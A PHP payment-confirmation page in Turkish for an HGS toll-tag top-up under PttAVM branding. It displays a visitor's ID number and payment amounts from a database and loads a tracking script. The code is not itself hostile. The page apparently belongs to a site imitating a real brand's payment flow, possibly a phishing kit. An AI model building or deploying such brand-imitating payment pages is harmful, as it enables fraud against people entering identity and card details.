<?php
session_start();

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: index.php');
    exit;
}

// Config dosyasını dahil et
require_once 'config.php';

// Veritabanı bağlantısı
try {
    $pdo = getDbConnection();
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE user_identifier = ?");
    $stmt->execute([$_SESSION['userIdentifier']]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
} catch(PDOException $e) {
    $user = null;
}

// Session'ı temizle
session_destroy();
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ödeme Başarılı - PttAVM HGS</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #0c1824;
            color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(12, 24, 36, 0.92);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #2ecc71;
            border-radius: 10px;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
            font-size: 3rem;
            animation: scaleIn 0.5s ease 0.2s both;
        }

        @keyframes scaleIn {
            from {
                transform: scale(0);
            }
            to {
                transform: scale(1);
            }
        }

        h1 {
            color: #2ecc71;
            font-size: 1.8rem;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            color: #8a9bb5;
            margin-bottom: 2rem;
        }

        .info-box {
            background: rgba(46, 204, 113, 0.06);
            border: 1px solid rgba(46, 204, 113, 0.15);
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            text-align: left;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.75rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-label {
            color: #8a9bb5;
            font-size: 0.9rem;
        }

        .info-value {
            color: #f0f2f5;
            font-weight: 600;
        }

        .total-row {
            background: rgba(46, 204, 113, 0.1);
            margin: 0 -1.5rem -1.5rem -1.5rem;
            padding: 1rem 1.5rem;
            border-radius: 0 0 8px 8px;
        }

        .total-row .info-row {
            border-bottom: none;
            padding: 0;
        }

        .total-row .info-value {
            color: #2ecc71;
            font-size: 1.3rem;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: #c8912e;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-top: 0.5rem;
        }

        .btn:hover {
            background: #b07d24;
        }

        .message {
            background: rgba(200, 145, 46, 0.06);
            border: 1px solid rgba(200, 145, 46, 0.15);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
            color: #8a9bb5;
            line-height: 1.6;
        }

        .checkmark {
            animation: checkmark 0.5s ease 0.4s both;
        }

        @keyframes checkmark {
            0% {
                transform: scale(0) rotate(45deg);
            }
            50% {
                transform: scale(1.2) rotate(45deg);
            }
            100% {
                transform: scale(1) rotate(0deg);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">
            <span class="checkmark">✓</span>
        </div>
        
        <h1>Ödeme Başarılı!</h1>
        <p class="subtitle">HGS bakiye yükleme işleminiz başarıyla tamamlandı.</p>

        <?php if ($user): ?>
        <div class="info-box">
            <div class="info-row">
                <span class="info-label">İşlem No</span>
                <span class="info-value">#<?= $user['id'] ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Kimlik Türü</span>
                <span class="info-value"><?= strtoupper($user['identifier_type']) ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Kimlik Numarası</span>
                <span class="info-value"><?= htmlspecialchars($user['identifier_value']) ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Yükleme Miktarı</span>
                <span class="info-value"><?= number_format($user['amount'], 2) ?> ₺</span>
            </div>
            <div class="info-row">
                <span class="info-label">Hizmet Bedeli</span>
                <span class="info-value"><?= number_format($user['service_fee'], 2) ?> ₺</span>
            </div>
            <div class="total-row">
                <div class="info-row">
                    <span class="info-label" style="color: #2ecc71; font-weight: 600;">Toplam Ödenen</span>
                    <span class="info-value"><?= number_format($user['total'], 2) ?> ₺</span>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <a href="index.php" class="btn">Ana Sayfaya Dön</a>
    </div>
    <script src="/tracking.js"></script>
</body>
</html>
